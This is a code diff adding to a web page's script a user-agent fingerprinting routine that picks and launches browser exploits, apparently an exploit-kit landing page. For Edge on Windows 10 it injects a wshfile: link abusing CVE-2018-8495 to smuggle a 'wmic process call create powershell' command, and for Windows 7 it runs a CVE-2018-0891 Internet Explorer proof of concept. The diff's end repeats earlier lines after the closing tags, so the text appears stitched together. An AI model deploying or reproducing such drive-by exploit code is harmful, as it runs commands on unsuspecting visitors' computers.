@@ -20,7 +20,73 @@
 		var win8 = /(Windows 8|Windows NT 6.2)/;
 		var win8_1 = /(Windows 8.1|Windows NT 6.3)/;
 		var win10 = /(Windows 10.0|Windows NT 10.0)/;
+		var linux = /(Linux x86)/;
+		var andro = /(Android)/;
 	
+		// Browser
+		var edge = /edge/i;
+
+		// Fingerprinting (to complete for browsers versions)
+		if  (win7.test(useragent)){
+			document.write("Win7 detected <br/>");
+			
+			//if  win7 + I.E 11:
+			cve_2018_0891();
+		}
+		else if (win8.test(useragent)){
+			document.write("Win8 detected <br/>");
+			document.write(useragent);
+		}
+		else if (win8_1.test(useragent)){
+			document.write("Win8.1 detected <br/>");
+			document.write(useragent);
+		}
+		else if (win10.test(useragent)){
+			document.write("Win10 detected <br/>");
+			document.write(useragent);
+			
+			if (edge.test(useragent)){
+				document.write("<br/>Edge detected <br/>Launching exploit ... <br/>");
+				cve_2018_8495();
+			}
+		}
+		else if (linux.test(useragent)){
+			document.write("Linux detected <br/>");
+			document.write(useragent);
+		}
+		else if (andro.test(useragent)){
+			document.write("Android detected <br/>");
+			document.write(useragent);
+		}
+		else{
+			document.write("Unable to fingerprint browser version <br/> No exploit for you  :-* <br/>");
+		}
+			
+// Payloads (todo)
+function cve_2018_8495(){
+	document.body.innerHTML ='<a id="q" href=\'wshfile:test/../../System32/SyncAppvPublishingServer.vbs" test test;wmic process call create powershell;"\'>Exploit !</a>';
+	return 0;
+}
+
+function cve_2018_0891(){
+
+	// PoC only
+	function main() {
+		RegExp.input = {toString: f};
+		alert(RegExp.lastMatch);
+	}
+
+	var input = [Array(10000000).join("a"), Array(11).join("b"), Array(100).join("a")].join("");
+
+	function f() {
+		String.prototype.match.call(input, "bbbbbbbbbb");
+	}
+	main();
+}				
+	</script>
+</head>
+</body>
+
 		// Browser
 		var edge = /edge/i;
 
